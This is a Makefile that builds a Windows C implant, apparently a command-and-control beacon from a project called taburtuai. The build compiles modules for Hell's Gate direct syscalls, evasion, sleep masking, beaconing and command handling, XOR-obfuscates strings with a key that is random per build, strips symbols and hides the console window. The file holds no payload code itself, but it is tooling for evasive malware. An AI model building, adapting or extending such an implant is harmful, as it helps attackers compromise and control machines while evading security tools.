# Makefile — taburtuai C implant
# Requires: x86_64-w64-mingw32-gcc, nasm, python3
# Usage:
#   make              — release build → build/implant.exe
#   make DEBUG=1      — debug build
#   make OBF_KEY=a7   — override XOR key (default: random per build)
#   make clean

CC      := x86_64-w64-mingw32-gcc
NASM    := nasm
PYTHON  := python3

SRCDIR  := src
ASMDIR  := asm
INCDIR  := include
OUTDIR  := build
TOOLDIR := tools

SRCS := $(SRCDIR)/entry.c      \
        $(SRCDIR)/hellsgate.c   \
        $(SRCDIR)/syscalls.c    \
        $(SRCDIR)/crypto.c      \
        $(SRCDIR)/utils.c       \
        $(SRCDIR)/evasion.c     \
        $(SRCDIR)/sleep_mask.c  \
        $(SRCDIR)/beacon.c      \
        $(SRCDIR)/commands.c    \
        $(SRCDIR)/obf_table.c

ASM_SRC := $(ASMDIR)/syscall_stub.asm
ASM_OBJ := $(OUTDIR)/syscall_stub.o

OBJS := $(patsubst $(SRCDIR)/%.c, $(OUTDIR)/%.o, $(SRCS)) $(ASM_OBJ)

# ── Per-build XOR key ──────────────────────────────────────────────────────
# Generate a random key unless OBF_KEY is set by the caller (generator_c.go
# passes --obf-key=XX when invoking make).
ifndef OBF_KEY
OBF_KEY := $(shell python3 -c "import random; print('%02x' % random.randint(1,254))")
endif

# ── Flags ──────────────────────────────────────────────────────────────────

CFLAGS_COMMON := -I$(INCDIR) \
                 -Wall -Wextra -Wno-unused-parameter \
                 -masm=intel \
                 -fno-stack-protector \
                 -fno-ident \
                 -fvisibility=hidden \
                 -D_WIN32_WINNT=0x0A00

ifeq ($(DEBUG),1)
CFLAGS   := $(CFLAGS_COMMON) -O0 -g
LDFLAGS  := -mwindows -static -static-libgcc
TARGET   := $(OUTDIR)/implant_debug.exe
else
CFLAGS   := $(CFLAGS_COMMON) -O2 -s \
             -ffunction-sections -fdata-sections
LDFLAGS  := -mwindows -static -static-libgcc \
             -Wl,--gc-sections \
             -Wl,--strip-all \
             -Wl,-subsystem,windows
TARGET   := $(OUTDIR)/implant.exe
endif

NASMFLAGS := -f win64

# ── Rules ──────────────────────────────────────────────────────────────────

.PHONY: all clean obfuscate info

all: $(OUTDIR) obfuscate $(TARGET)

$(OUTDIR):
	mkdir -p $(OUTDIR)

# String obfuscation — runs before any compilation
obfuscate: $(SRCDIR)/obf_table.c

$(SRCDIR)/obf_table.c: $(TOOLDIR)/gen_obf.py $(SRCDIR)/hellsgate.c $(SRCDIR)/beacon.c \
                        $(SRCDIR)/evasion.c $(SRCDIR)/commands.c $(SRCDIR)/sleep_mask.c
	$(PYTHON) $(TOOLDIR)/gen_obf.py . $(OBF_KEY)

# Compile C sources (obf_table.c depends on obfuscate target above)
$(OUTDIR)/%.o: $(SRCDIR)/%.c $(INCDIR)/implant.h $(INCDIR)/ntdefs.h $(INCDIR)/config.h
	$(CC) $(CFLAGS) -c $< -o $@

# Assemble syscall stub
$(ASM_OBJ): $(ASM_SRC)
	$(NASM) $(NASMFLAGS) $< -o $@

# Link
$(TARGET): $(OBJS)
	$(CC) $(OBJS) -o $@ $(LDFLAGS) \
	    -lkernel32 -lntdll -lpsapi

clean:
	rm -rf $(OUTDIR) $(SRCDIR)/obf_table.c

.PHONY: info
info: $(TARGET)
	@echo "Build: $(TARGET)  key=0x$(OBF_KEY)"
	@ls -lh $(TARGET)
